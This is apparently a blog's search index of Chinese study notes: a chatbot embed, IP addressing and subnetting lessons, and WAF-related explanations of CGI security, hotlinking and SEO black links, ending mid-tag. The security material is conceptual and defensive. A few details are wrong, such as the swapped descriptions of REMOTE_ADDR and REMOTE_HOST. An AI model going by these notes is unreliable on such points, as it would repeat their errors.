<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>吃饭AI小助手</title>
    <link href="/posts/450afc9b.html"/>
    <url>/posts/450afc9b.html</url>
    
    <content type="html"><![CDATA[<h1>MaxKB吃饭决定器</h1><iframe src="http://49.233.251.176:10087/ui/chat/52ca027c4de08545" style="width: 100%; height: 500px;" <!-- 建议固定高度 -->  frameborder="0"  allow="microphone"></iframe>]]></content>
    
    
    <categories>
      
      <category>AI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/posts/0.html"/>
    <url>/posts/0.html</url>
    
    <content type="html"><![CDATA[<h1>IP以及IP划分</h1><h3 id="什么是IP地址"><a class="header-anchor" href="#什么是IP地址">¶</a>什么是IP地址</h3><p>IP地址（Internet Protocol Address）是指互联网协议地址，又称网际协议地址。IP地址是IP协议提供的一种统一的地址格式，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，以此来屏蔽物理地址的差异。因此，IP地址是逻辑地址，每台主机的网卡上的MAC地址才是物理地址<br>IP地址其实是一串32位的二进制数，为了方便我们记忆我们以8位一组进行划分，中间用小数点分割，类似：172.20.5.6（10110110.00010100.00000101.00000110）</p><h3 id="IPv4"><a class="header-anchor" href="#IPv4">¶</a>IPv4</h3><p>根据使用场景（范围）</p><p>IPv4地址 有限地址 2^32  --约42亿</p><p>私有地址 --免费使用、本地唯一性</p><p>公有地址 --付费使用、全球唯一性</p><p>IPv4地址根据网络ID的不同分为5种类型，A类地址、B类地址、C类地址、D类地址和E类地址。</p><p>1、A类IP地址：一个A类IP地址由1字节（8位）的网络地址和3字节主机地址组成，网络地址的最高位必须是“0”， 地址范围从<strong>1.0.0.0 ~126.0.0.0</strong>。可用的A类网络有126（2<sup>7-2）个，每个网络能容纳1亿多(2</sup>24-2)个主机。</p><p>2、B类IP地址：一个B类IP地址由2个字节的网络地址和2个字节的主机地址组成，网络地址的最高位必须是“10”，地址范围从<strong>128.0.0.0~191.255.255.255</strong>。可用的B类网络有16382（2<sup>14-1）个，每个网络能容纳6万多（2</sup>16-2）个主机 。</p><p>3、 C类IP地址：一个C类IP地址由3字节的网络地址和1字节的主机地址组成，网络地址的最高位必须是“110”。范围从<strong>192.0.0.0~223.255.255.255</strong>。C类网络可达209万余(2<sup>21-1)个，每个网络能容纳254（2</sup>8-2）个主机。</p><p>4、 D类地址：D类IP地址第一个字节以“lll0”开始，它是一个专门保留的地址。它并不指向特定的网络</p><p>5、 E类IP地址：以“llll0”开始，为将来使用保留。 全零（<strong>“0.0.0.0”</strong>）地址对应于当前主机。全“1”的IP地址（<strong>“255.255.255.255”</strong>）是当前子网的广播地址。</p><ul><li>D类IP地址。其范围是从<strong>224.0.0.0到239.255.255.255</strong>，用于网络中的组播（多点广播）通信。</li><li>E类IP地址。其范围是从<strong>240.0.0.0到255.255.255.255</strong>，主要用于将来使用和实验目的。</li></ul><img src="/posts/0/8f813080e5af4b0c90eae497fabfaa81.png" class title="img"><p>其中ABC三类地址为单播地址、D类地址为多（组）播地址、E类地址科研使用，保留</p><p>**单播地址：**既可以作为源地址，也可以作为目标地址使用</p><p>**多（组）播地址：**只能作为目标地址去使用</p><p>主类网：默认情况下，ABC三类地址的网络位、拥有默认的子网掩码长度</p><p>A  /8    255.0.0.0</p><p>B  /16   255.255.0.0</p><p>C  /24   255.255.255.0</p><p>私有地址范围：</p><p><strong>A：10.0.0.0/8</strong></p><p><strong>B：172.16.0.0/16-172.31.0.0/16</strong></p><p><strong>C：192.168.0.0/24-192.168.255.0/24</strong></p><h4 id="本地私有地址"><a class="header-anchor" href="#本地私有地址">¶</a>本地私有地址</h4><p>169.254.x.x/16    本地私有地址<br>作用：当PC无法通过自动获取IP地址的方式(DHCP)获取到IP地址时，PC会自动产生一个IP地址，即169.254.x.x/16</p><p>192.168.1.0/24    主机位全 0 的地址-网络地址</p><p><strong>主机位全0</strong> 的地址代表一个网段，代表本网段内的所有IP地址 —xxx班全体同学</p><p>代表地址范围：<strong>192.168.1.1/24-192.168.1.255/24</strong></p><p><strong>此地址不能给主机使用</strong></p><p><strong>192.168.1.255/24  主机位全 1 的地址-广播地址</strong></p><p>主机位全1 的地址代表本网段内的广播地址，只能作为目标地址使用；也不能给主机使用 —xx班班群内@所有人</p><p>在一个网段内，除了主机位全0和主机位全1 的地址外，剩下的地址均可给主机使用</p><blockquote><p>例：</p><p>写出172.16.3.0/16 的可用地址范围、可用主机数量、以及广播地址和网络地址</p><p>172.16.3.0/16、</p><p>可用主机数量：</p><p>65534=2^16-2</p><p>可用地址范围：</p><p>172.16.0.1/16-172.16.255.254/16</p><p>2^主机位-2</p><p>网络地址 172.16.0.0/16</p><p>广播地址 172.16.255.255/16</p></blockquote><p>VLSM 可变长子网掩码 --子网划分</p><p>将原来的一个大的广播域逻辑的划分为若干个小的广播域</p><p>做法：通过借用主机位来充当网络位，实现</p><blockquote><p>例1. 借1位 划分2个广播域–2个网段</p><p><strong>192.168.1.0/24</strong></p><p>192.168.1.00000000/24+1=25</p><p>192.168.1.10000000/24+1=25</p><p><strong>192.168.1.0/25</strong></p><p>可用地址范围：192.168.1.1/25-192.168.1.126/25</p><p>可用主机数量:126=2^25-2</p><p>网络地址：192.168.1.0/25</p><p>广播地址:192.168.1.127/25</p><p><strong>192.168.1.128/25</strong></p><p>可用地址范围：192.168.1.129/25-192.168.1.254/25</p><p>可用主机数量:126</p><p>网络地址：192.168.1.128/25</p><p>广播地址:192.168.1.255/25</p><p>例2. 借2位 划分 4个广播域--  4个网段</p><p><strong>192.168.1.0/24</strong></p><p>192.168.1.00000000/24+2=26</p><p>192.168.1.01000000/24+2=26</p><p>192.168.1.10000000/24+2=26</p><p>192.168.1.11000000/24+2=26</p><p><strong>192.168.1.0/26</strong></p><p>网络地址：192.168.1.0/26</p><p>广播地址：192.168.1.63/26</p><p>可用地址范围：192.168.1.1/26 - 192.168.1.62/26</p><p>可用地址数量：62  =  2^6-2</p><p><strong>192.168.1.64/26</strong></p><p>网络地址：192.168.1.64/26</p><p>广播地址：192.168.1.127/26</p><p>可用地址范围：192.168.1.65/26 - 192.168.1.126/26</p><p>可用地址数量：62  =  2^6-2</p><p><strong>192.168.1.128/26</strong></p><p>网络地址：192.168.1.128/26</p><p>广播地址：192.168.1.191/26</p><p>可用地址范围：192.168.1.129/26 - 192.168.1.190/26</p><p>可用地址数量：62  =  2^6-2</p><p><strong>192.168.1.192/26</strong></p><p>借3位 划分 8个广播域-- 8个网段</p><p>192.168.1.0/24</p><p>192.168.1.00000000/24+3=27</p><p>192.168.1.00100000/24+3=27</p><p>192.168.1.01000000/24+3=27</p><p>192.168.1.01100000/24+3=27</p><p>192.168.1.10000000/24+3=27</p><p>192.168.1.10100000/24+3=27</p><p>192.168.1.11000000/24+3=27</p><p>192.168.1.11100000/24+3=27</p><p><strong>192.168.1.0/27</strong></p><p>网络地址：192.168.1.0/27</p><p>广播地址：192.168.1.31/27</p><p>可用地址范围：192.168.1.1/27 - 192.168.1.30/27</p><p>可用地址数量：30  =  2^5-2</p><p>192.168.1.32/27</p><p>192.168.1.64/27</p><p>192.168.1.96/27</p><p>192.168.1.128/27</p><p>192.168.1.160/27</p><p>192.168.1.192/27</p><p>192.168.1.224/27</p></blockquote><p>划分网段数量=2^借位</p><p>可用主机数量=2^主机位-2（网络地址、广播地址）</p><p>可用地址范围=网络地址+1 - 广播地址-1</p><p>划分网段之间的关系：</p><p>简便算法：</p><p>首先：必须要找到首段地址，之后递增网段，递增的数值就是借位的最低位（最右边那位）的代表数字（也就是掩码：例：/27 就是第27位的代表数字）</p><h3 id="IPv6"><a class="header-anchor" href="#IPv6">¶</a>IPv6</h3><p>IPv6地址中分为<strong>本地链路地址（Link-Local Address）<strong>与</strong>全局单播地址（Global Address）。</strong><br>本地链路地址根据mac等信息通过指定算法得到，不需要从路由器获取。以<strong>fe80</strong>:开头<br>全局单播地址从需要和路由器进行协商获取，可以与公网通信。</p><p>全局单播地址可通过手动或自动方式配置，其中自动方式分为“**有状态”**和“<strong>无状态</strong>”。</p><p>有状态：可控、可管理。在网络中存在一个IP地址管理者，它能够识别客户端，根据不同的客户端，分配对应的IPv6地址，客户端与服务端之间需要维护IP地址的租期及续约。目前实现这种效果的，就是DHCPv6协议，IP地址管理者就是DHCPv6 Server</p><p>无状态：不可控、难管理。在网络中只有网关，没有IP地址管理者。因此无人去识别客户端，每个客户端根据网关发送的相同的RA报文内容，自行配置IPv6地址</p><p><strong>在这种情况下，IPv6相关网络配置具有三种方式。</strong></p><p><strong>无状态（Stateless）</strong>：通过邻居管理协议RA报文，从路由公告中配置IPv6地址。RA报文中会携带前缀等信息。同时IPv6DNS等信息也从RA报文中获取。<br><strong>有状态（Stateful DHCPv6）</strong>：通过DHCPv6协议获取IPv6相关信息。包括IP地址及DNS等信息。<br><strong>无状态DHCPv6（Stateless DHCPv6）</strong>：这种介于上面两种形式中间，IP地址从RA报文中计算得到，而DNS信息，通过DHCPv6协议获取。</p><h4 id="RA、RS报文"><a class="header-anchor" href="#RA、RS报文">¶</a>RA、RS报文</h4><p><strong>简介</strong><br>**NDP（Neighbor Discovery Protocol，邻居发现协议）**是IPv6的基础协议，它组合了IPv4中的ARP、ICMP路由器发现和ICMP重定向等协议，并对它们作了改进。作为IPv6的基础性协议，NDP还提供了前缀发现、邻居不可达检测、重复地址监测、地址自动配置等功能。</p><p>NDP定义了5种ICMPv6报文类型，包括<strong>RS、RA、NS、NA和Redirect</strong>报文。</p><p><strong>NS、NA</strong>简单来说就是邻居设备之间互通信息，完成<strong>IPv6地址到链路层地址的解析</strong>，然后通过解析后得到的链路层地址和IPv6等地址信息来建立相应的邻居缓存表项。</p><p>而RS、RA报文用于路由器发现</p><p>路由器发现是指主机定位本地链路上的路由器和确定其配置信息的过程，主要包含以下3方面内容：</p><p>路由器发现（Router Discovery）：主机发现邻居路由器及选择某一个路由器作为默认网关的过程。<br>前缀发现（Prefix Discovery）：主机发现本地链路上的一组IPv6前缀，生成前缀列表。该列表用于主机的地址自动配置和on-link判断。<br>参数发现（Parameter Discovery）：主机发现相关操作参数的过程，如MTU、报文的默认跳数限制、地址分配方式等信息。<br><strong>全球单播地址的配置步骤如下</strong>：<br>1）客户端在配置好链路本地地址后，发送RS报文，请求路由器的前缀信息。<br>2）路由器收到RS报文后，发送单播RA报文，其中携带M、O flag用于指示进行何种类型配置，A flag用于无状态地址自动配置的前缀信息。同时路由器也会周期性地发送组播RA报文。<br>3）客户端根据RA报文携带A flag，获取网关信息。如果是自动配置或者是无状态，则根据M、O flag，选择IPv6地址及DNS的获取方式<br><strong>三个flag:M O A</strong></p><p>**M flag：**Managed address<br>configuration字段，为1通过DHCPv6获取IP地址，为0则是通过RA报文获取地址。<br>**O flag：**Other configuration字段，为1通过DHCPv6获取DNS等其他配置，为0通过RA报文获取其他配置。<br>虽然M O flag具有四种组合，但实际中M=0，0=0是一直错误的配置，因为当IP通过DHCPv6<br>Server获取时，相应的DNS等其他配置信息也应从DHCPv6 Server获取以保证业务的连通性。</p><p>**A flag：**Autonomous address-configuration<br>flag(A)字段，表示是否可以使用RA报文前缀信息配置无状态地址。<br>通过前缀，可以获取子网掩码长度，网关，以及计算出IP地址，图中例子，前缀信息如下：</p> <figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">ICMPv6</span> <span class="hljs-selector-tag">Option</span> (Prefix <span class="hljs-attribute">information </span>: <span class="hljs-number">2409</span>:<span class="hljs-number">8</span><span class="hljs-attribute">a20</span>:<span class="hljs-attribute">c1a</span>:<span class="hljs-attribute">ce70</span>::/<span class="hljs-number">64</span>)<br></code></pre></td></tr></table></figure><p>如果是客户端采用自动配置，那么则完全根据RA报文来决定如何获取IPv6相关配置，当然，客户端也可以无视RA报文，选择自己想要的配置方式。（如上图，RA报文配置为无状态DHCPv6模式，但是客户端其实也可以通过DHCPv6来获取有状态地址，只要DHCPv6 Server支持即可）。</p><p>所以，有状态及无状态地址并不是完全互斥，他们可以同时存在，如下图可以理解其流程：</p><img src="/posts/0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L215dmVzdA==,size_16,color_FFFFFF,t_70.png" class title="IPv6分配流程"><h4 id="地址构成"><a class="header-anchor" href="#地址构成">¶</a>地址构成</h4><p>IPv6 与 <a href="https://so.csdn.net/so/search?q=IPv4&amp;spm=1001.2101.3001.7020">IPv4</a> 最显著的不同，就是其超大的地址空间。IPv4 有32比特 (4字节)，允许大约42.9亿（232）个地址。而 IPv6 定义了128比特 (16字节)，支持大约340 x 1036个地址。这是一个相当可观的数字，在可预见的未来都不会出现地址枯竭的问题。典型的 IPv6 地址可被划分成两部分。如下图所示，开头的64比特用来代表网络，后面的64比特用作接口标识：</p><p><a href="https://www.packetmania.net/2020/12/01/IPv6-Addressing/ipv6-addr-format.png"><img src="https://img-blog.csdnimg.cn/img_convert/18c4515a87b9ae6c8e0492c3feae7c34.png" alt="img"></a></p><p>接口标识(interface ID)可以有多种方式产生：</p><ul><li>静态手工设置</li><li><a href="https://en.wikipedia.org/wiki/IPv6_address#Modified_EUI-64">链路层地址 (MAC) 转化为64比特 EUI-64</a></li><li>由 DHCPv6 指定</li><li>由隐私扩展或加密协议生成</li></ul><p>为了便于书写，IPv6 推荐末端加上网络前缀长度的压缩格式标记，据此上面的地址可以缩短表示为： 2001:db8:130f**:😗*7000:<strong>0</strong>:140b/<strong>64</strong></p><p>2101:db6::/64 这个子网我想拆成有8个子网， 那8个子网分别是多少？</p><p>首先我们要知道IPv6 地址位有128位，一个IPv6由8个地址节组成，每个地址节为16位，所以2101:db6::/64  完整的16进制表达方式及二进制方式如下图</p><img src="/posts/0/97765b8783d51e23df97e63618c27eb5.png" class title="img"><p>2101这样一个地址节有16位，拆成二进制表达方式为 0010 0001 0000 0001</p><p>所以以上要拆成8个子网（2^3=8）需要在原来的64位在往后延伸 3位，所以需要向下一个地址节中的第一个16进制数字中借用三位   0000</p><img src="/posts/0/4cbabd46d2d07ad602d4d562ae98af14.png" class title="img"><p>所以2101:db6::/64 这个子网拆成有8个子网有以下</p><img src="/posts/0/29ab14509c068d6ae04110cde759637c.png" class title="img"><p>所以完整的8个子网的地址网段为</p><p>简写：2101:db6::/64</p><p>完整写法：2101:0DB6:0000:0000:0000:0000:0000:0000/64</p><p>网络地址2101:0DB6:0000:0000:0000:0000:0000:0000<br>起始地址2101:0DB6:0000:0000:0000:0000:0000:0000<br>结束地址2101:0DB6:0000:0000:FFFF:FFFF:FFFF:FFFF<br>IP 数量18446744073709551616</p><blockquote><p>子网1：2101:0db6:0000:0000:0000:0000:0000:0000/67</p><p>网络地址2101:0DB6:0000:0000:0000:0000:0000:0000<br>起始地址2101:0DB6:0000:0000:0000:0000:0000:0000<br>结束地址2101:0DB6:0000:0000:1FFF:FFFF:FFFF:FFFF<br>IP 数量2305843009213693952<br>子网2：2101:0db6:0000:0000:2000:0000:0000:0000/67</p><p>网络地址2101:0DB6:0000:0000:2000:0000:0000:0000<br>起始地址2101:0DB6:0000:0000:2000:0000:0000:0000<br>结束地址2101:0DB6:0000:0000:3FFF:FFFF:FFFF:FFFF<br>IP 数量2305843009213693952<br>子网3：2101:0db6:0000:0000:4000:0000:0000:0000/67</p><p>网络地址2101:0DB6:0000:0000:4000:0000:0000:0000<br>起始地址2101:0DB6:0000:0000:4000:0000:0000:0000<br>结束地址2101:0DB6:0000:0000:5FFF:FFFF:FFFF:FFFF<br>IP 数量2305843009213693952<br>子网4：2101:0db6:0000:0000:6000:0000:0000:0000/67</p><p>网络地址2101:0DB6:0000:0000:6000:0000:0000:0000<br>起始地址2101:0DB6:0000:0000:6000:0000:0000:0000<br>结束地址2101:0DB6:0000:0000:7FFF:FFFF:FFFF:FFFF<br>IP 数量2305843009213693952<br>子网5：2101:0db6:0000:0000:8000:0000:0000:0000/67</p><p>网络地址2101:0DB6:0000:0000:8000:0000:0000:0000<br>起始地址2101:0DB6:0000:0000:8000:0000:0000:0000<br>结束地址2101:0DB6:0000:0000:9FFF:FFFF:FFFF:FFFF<br>IP 数量2305843009213693952<br>子网6：2101:0db6:0000:0000:a000:0000:0000:0000/67</p><p>网络地址2101:0DB6:0000:0000:A000:0000:0000:0000<br>起始地址2101:0DB6:0000:0000:A000:0000:0000:0000<br>结束地址2101:0DB6:0000:0000:BFFF:FFFF:FFFF:FFFF<br>IP 数量2305843009213693952<br>子网7：2101:0db6:0000:0000:c000:0000:0000:0000/67</p><p>网络地址2101:0DB6:0000:0000:C000:0000:0000:0000<br>起始地址2101:0DB6:0000:0000:C000:0000:0000:0000<br>结束地址2101:0DB6:0000:0000:DFFF:FFFF:FFFF:FFFF<br>IP 数量2305843009213693952<br>子网8：2101:0db6:0000:0000:e000:0000:0000:0000/67</p><p>网络地址2101:0DB6:0000:0000:E000:0000:0000:0000<br>起始地址2101:0DB6:0000:0000:E000:0000:0000:0000<br>结束地址2101:0DB6:0000:0000:FFFF:FFFF:FFFF:FFFF<br>IP 数量2305843009213693952</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>WAF中相关漏洞原理以及防护原理</title>
    <link href="/posts/df8abfee.html"/>
    <url>/posts/df8abfee.html</url>
    
    <content type="html"><![CDATA[<p>相关问题：</p><ol><li>WAF中的数据压缩和高速缓存是用来做什么的？</li><li>协议合规检测是为了做什么？其中的具体参数的含义和作用？</li><li>人机识别的原理？</li><li>CGI安全原理？</li><li>业务流程控制的原理？</li><li>爬虫陷阱的工作原理？</li><li>什么是vary响应头？</li><li>http2概念介绍</li><li>DDos攻击各种攻击的具体原理</li><li>https卸载的原理和应用场景</li><li>什么是国密证书？自服务平台是否支持国密证书？</li></ol><p>[TOC]</p><h2 id="1-CGI安全"><a class="header-anchor" href="#1-CGI安全">¶</a>1.CGI安全</h2><p><a href="https://blog.csdn.net/macky0668/article/details/5783203">https://blog.csdn.net/macky0668/article/details/5783203</a></p><h3 id="什么是CGI"><a class="header-anchor" href="#什么是CGI">¶</a>什么是CGI</h3><p><strong>CGI（Common Gateway Interface）公共网关接口</strong>，是外部扩展应用程序与 Web 服务器交互的一个标准接口。它可以使外部程序处理www上客户端送来的表单数据并对此作出反应， 这种反应可以是文件、 图片、 声音、 视频等，可以在浏览器窗体上出现的任何数据 。服务器端与客户端进行交互的常见方式多，CGI 技术就是其中之一。根据CGI标准，编写外部扩展应用程序，可以对客户端浏览器输入的数据进行处理，完成客户端与服务器的交互操作。CGI规范定义了Web服务器如何向扩展应用程序发送消息，在收到扩展应用程序的信息后又如何进行处理等内容。对于许多静态的HTML网页无法实现的功能，通过 CGI可以实现，比如<strong>表单的处理、对数据库的访问、搜索引擎、基于Web的数据库访问</strong>等等。使用CGI实现客户端与服务器的交互有以下几个标准步骤，具体步骤如下：<br>（1）Web 客户端的浏览器将URL的第一部分解码与Web服务器相连。<br>（2）Web 浏览器将URL的其余部分提供给服务器。<br>（3）Web 服务器将URL转换成路径和文件名。<br>（4）Web 服务器发送 HTML 和别的组成请求页面的文件给客户。一旦页面内容传送完，<br>这个连接自动断开。<br>（5）在客户端，HTML脚本提示用户做动作或输入。当用户响应后，客户请求Web服务器建立一个新的连接。<br>（6）Web 服务器把这些信息和别的进程变量传送给由HTML以URL的形式指定CGI程序。<br>（7）CGI 根据输入作出响应，把响应结果传送给 Web 服务器。<br>（8）Web 服务器把响应的数据传给客户，完成后关闭连接。<br>服务器端 CGI 程序接收信息有三种途径：环境变量、命令行和标准输入。其中环境变量是指 CGI 定义一组环境变量，通过环境变量可传递数据。服务器收到来自浏览器的数据，调用 CGI 脚本，CGI 脚本将收到的数据转换成环境变量并从中取出所需要的内容。<form>标签的 METHOD 属性来决定具体使用哪一种方法。在“METHOD=GET”时，向 CGI 传递表单编码信息的是通过命令来进行的。表单编码信息大多数是通过环境变量 QUERY_STRING 来传递的。若“METHOD=POST”，表单信息通过标准输入来读取。还有一种不使用表单就可以向 CGI 传送信息的方法，那就是把信息直接附在 URL 地址后面，信息和URL 之间用问号（?）来进行分隔。GET 方法是对数据的一个请求，被用于获得静态文档。GET 方法通过将发送请求信息附加在 URL 后面的参数。当 GET 方法被使用时，CGI 程序将会从环境变量 QUERY_STRING获取数据。为了正确的响应客户端发来的请求，CGI 必须对 QUERY_STRING 中的字符串进行分析。当用户需要从服务器获取数据，但服务器上的数据不得改变时，应该用 GET 方法；但是如果请求中的字符串超过了一定长度，通常是 1024 字节，那么这时，只能用 POST 方法。POST 方法：浏览器将通过填写表单将数据传给服务器时一般采用POST 方法。在发送的数据超过 1024 字节时必须采用 POST 方法。当 POST 方法被使用时，Web 服务器向CGI 程序的标准输入 STDIN 传送数据。环境变量 CONTENT_LENGTH 存放着发送的数据长度。CGI 程序必须检查环境变量 REQUEST_METHOD 以确定有没有采用了 POST 方法，并决定是否要读取标准输入STDIN 。</form></p><img src="/posts/df8abfee/1620479739014-dfadb445-3cac-47c7-aa1f-c70004dedc19.webp" class title="image.png"><img src="/posts/df8abfee/1620479940947-d05ea351-b5b4-4cc5-96e8-81de2e8ac81d.webp" class title="image.png"><h3 id="CGI漏洞"><a class="header-anchor" href="#CGI漏洞">¶</a>CGI漏洞</h3><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-built_in">CGI</span>漏洞大多分为一下几种类型：暴露不该暴露的信息、执行不该执行的命令、溢出。<br></code></pre></td></tr></table></figure><h4 id="‌防范CGI漏洞"><a class="header-anchor" href="#‌防范CGI漏洞">¶</a>‌防范CGI漏洞</h4><p>**的关键在于采取一系列安全措施，包括输入验证、过滤用户输入、限制接收数据的长度、验证输入格式、避免执行意外的外部程序，并确保文件和脚本的权限设置恰当。**‌</p><ol><li>‌<strong>输入验证和过滤</strong>‌：用户输入是最容易被黑客攻击的部分，通过验证和过滤用户输入可以大大降低被攻击的风险。对于字符串输入，可以使用过滤函数对用户输入进行过滤，防止常见的注入攻击。对于数字输入，可以使用<code>is_numeric()</code>函数进行验证，确保输入为有效的数字。对于邮箱、网址等特定格式的输入，可以使用正则表达式进行验证‌。</li><li>‌<strong>限制接收数据的长度</strong>‌：编写安全的CGI脚本需要限制接收数据的长度，以防止过长的输入导致处理效率下降或潜在的安全风险‌。</li><li>‌<strong>避免执行意外的外部程序</strong>‌：应避免在CGI脚本中执行意外的外部程序，因为用户可能会利用这一点来执行恶意代码‌。</li><li><strong>确保文件和脚本的权限设置恰当</strong>‌：确保CGI脚本和相关文件的权限设置得当，以减少未经授权的访问和修改风险‌。</li><li>‌<strong>使用安全工具</strong>‌：使用CGI Wrap等工具可以提高安全性，而在使用他人提供的CGI脚本时，应追根溯源，确保代码来源可靠‌。</li></ol><p>‌CGI环境变量‌是CGI程序运行的基础，它们提供关键信息，如请求类型、URL、HTTP头等，对CGI程序的正常运行至关重要。这些环境变量帮助CGI程序理解客户端的请求，从而正确地处理和返回相应的结果。以下是CGI环境变量的主要用途：</p><p><strong>与请求相关的环境变量：</strong></p><p>REQUEST_METHOD：服务器与CGI程序之间的信息传输方式</p><p>QUERY_STRING：采用GET时所传输的信息</p><p>CONTENT_LENGTH：STDIO中的有效信息长度</p><p>CONTENT_TYPE：指示所传来的信息的MIME类型</p><p>CONTENT_FILE：使用Windows HTTPd/WinCGI标准时，用来传送数据的文件名</p><p>PATH_INFO：路径信息</p><p>PATH_TRANSLATED：CGI程序的完整路径名</p><p>SCRIPT_NAME：所调用的CGI程序的名字</p><p><strong>与服务器相关的环境变量</strong></p><p>GATEWAY_INTERFACE：服务器所实现的CGI版本</p><p>SERVER_NAME：服务器的IP或名字</p><p>SERVER_PORT：主机的端口号</p><p>SERVER_SOFTWARE：调用CGI程序的HTTP服务器的名称和版本号</p><p><strong>与客户端相关的环境变量</strong></p><p>REMOTE_ADDR：客户机的主机名</p><p>REMOTE_HOST：客户机的IP地址</p><p>ACCEPT：例出能被次请求接受的应答方式</p><p>ACCEPT_ENCODING：列出客户机支持的编码方式</p><p>ACCEPT_LANGUAGE：表明客户机可接受语言的ISO代码</p><p>AUTORIZATION：表明被证实了的用户</p><p>FORM：列出客户机的EMAIL地址</p><p>IF_MODIFIED_SINGCE：当用get方式请求并且只有当文档比指定日期更早时才返回数据</p><p>PRAGMA：设定将来要用到的服务器代理</p><p>REFFERER：指出连接到当前文档的文档的URL</p><p>USER_AGENT：客户端浏览器的信息</p><h2 id="2-盗链"><a class="header-anchor" href="#2-盗链">¶</a>2.盗链</h2><h3 id="什么是盗链"><a class="header-anchor" href="#什么是盗链">¶</a>什么是盗链</h3><p>盗链是指在一个网站上直接链接到另一个网站服务器上的文件的行为。简单来说，是指一个网站直接引用了其他网站上的资源（如图片、视频、文档等），而用户在访问这个网站时，实际上是在消耗被盗链网站的带宽和资源，但这些资源的流量和价值却归属到了盗链网站上。例如，网站 A 的管理员发现网站 B 有一张很好的图片，他不将图片下载后上传到自己的服务器，而是在自己的网页代码中直接引用网站 B 的图片 URL。这样，每当有人访问网站 A 的这个页面，图片都是从网站 B 的服务器上加载的。</p><h3 id="盗链原理"><a class="header-anchor" href="#盗链原理">¶</a>盗链原理</h3><p>盗链攻击的原理其实很简单，就是利用了 HTTP 协议的 referer 机制。当用户访问一个网站时，浏览器会自动将当前页面的 URL 作为 referer 信息发送给服务器。服务器根据 referer 信息判断请求是否合法，如果合法，则返回相应的资源；否则，拒绝请求。攻击者通过篡改 referer 信息，使得服务器误以为请求是合法的，从而实现盗链。</p><h3 id="盗链类型"><a class="header-anchor" href="#盗链类型">¶</a>盗链类型</h3><p>根据攻击手段和目的的不同，盗链攻击可以分为以下几种类型：</p><ul><li><strong>直接盗链</strong>：攻击者直接将目标网站的资源链接嵌入到自己的网站中，用户访问时，资源请求会发送到目标网站服务器。</li><li><strong>代理盗链</strong>：攻击者搭建一个代理服务器，将目标网站的资源通过代理服务器转发给用户，从而隐藏真实的 referer 信息。</li><li><strong>iframe 盗链</strong>：攻击者通过 iframe 标签将目标网站嵌入到自己的网页中，用户访问时，实际上是访问了目标网站。</li><li><strong>图片盗链</strong>：攻击者将目标网站的图片资源嵌入到自己的网站中，用户访问时，图片请求会发送到目标网站服务器。</li><li><strong>音频/视频盗链</strong>：攻击者将目标网站的音频或视频资源嵌入到自己的网站中，用户访问时，音频或视频请求会发送到目标网站服务器。</li></ul><h3 id="盗链防范措施"><a class="header-anchor" href="#盗链防范措施">¶</a>盗链防范措施</h3><p>为了防范盗链攻击，可以采取以下措施（但不仅限于以下措施）：</p><ul><li>定期修改文件名和目录名，使得攻击者无法通过固定的 URL 访问到资源。</li><li>验证 Header 中 Referer 字段信息，判断请求是否来自合法的源网站。如果不是，则拒绝请求。这是最常见的防盗链方法，但也有局限性，如用户禁用 Referer 或黑客伪造 Referer。</li><li>为资源 URL 添加动态生成的签名参数，只有签名正确的请求才能访问资源，增加盗链的难度。</li><li>使用加密技术，对资源进行加密，使得攻击者无法直接访问到原始资源。</li><li>对于频繁访问的 IP 地址，可以采取限制请求频率的措施，防止攻击者大量盗链。或者根据请求的来源 IP 地址决定是否提供服务，只允许特定 IP 或 IP 段访问。</li><li>将资源部署到 CDN 节点上，减轻服务器负载，提高访问速度。大多数 CDN 服务商也提供内置的防盗链功能。</li><li>在图片或视频上添加水印，即使被盗链也能标示出原始来源。</li></ul><h2 id="3-黑链（暗链）"><a class="header-anchor" href="#3-黑链（暗链）">¶</a>3.黑链（暗链）</h2><hr><p>捧着一颗心来，不带半根草去。</p><p>——陶行知</p><h2 id="1-相关概念"><a class="header-anchor" href="#1-相关概念">¶</a>1 相关概念</h2><h3 id="1-1-SEO"><a class="header-anchor" href="#1-1-SEO">¶</a>1.1 SEO</h3><p>SEO（Search Engine Optimization），即搜索引擎优化。是一种方式：利用搜索引擎的规则提高网站在有关搜索引擎内的自然排名。目的是让其在行业内占据领先地位，获得品牌收益。很大程度上是网站经营者的一种商业行为，将自己或自己公司的排名前移。</p><p>搜索引擎优化的技术手段主要有黑帽（black hat）、白帽（white hat）两大类。通过作弊手法欺骗搜索引擎和访问者，最终将遭到搜索引擎惩罚的手段被称为黑帽，比如隐藏关键字、制造大量的meta字、alt标签等。而通过正规技术和方式，且被搜索引擎所接受的SEO技术，称为白帽。</p><h3 id="1-2-PR值"><a class="header-anchor" href="#1-2-PR值">¶</a>1.2 PR值</h3><p>PR值全称为PageRank，用来表现网页等级的一个标准，级别分别是0到10，是Google用于评测一个网页“重要性”的一种方法。级别从1到10级，SEO百度排名，10级为满分。PR值越高说明该网页越受欢迎（越重要）。</p><h3 id="1-3-暗（黑）链"><a class="header-anchor" href="#1-3-暗（黑）链">¶</a>1.3 暗（黑）链</h3><p>暗链就是看不见的网站链接，暗链在网站中的链接做得非常隐蔽，短时间内不易被搜索引擎察觉。它和友情链接有相似之处，可以有效地提高PR值。但要注意一点PR值是对单独页面，而不是整个网站。</p><p>黑链是SEO手法中相当普遍的一种手段，笼统地说，它就是指一些人用非正常的手段获取的其它网站的反向链接，最常见的黑链就是通过各种网站程序漏洞获取搜索引擎权重或者PR较高的网站的webshell，进而在被黑网站上链接自己的网站，其性质与明链一致，都是属于为高效率提升排名，而使用的作弊手法。</p><p>一般情况下，两者实际是等价的。</p><h2 id="2-研究样本"><a class="header-anchor" href="#2-研究样本">¶</a>2 研究样本</h2><h3 id="2-1-Referer作弊"><a class="header-anchor" href="#2-1-Referer作弊">¶</a>2.1 Referer作弊</h3><img 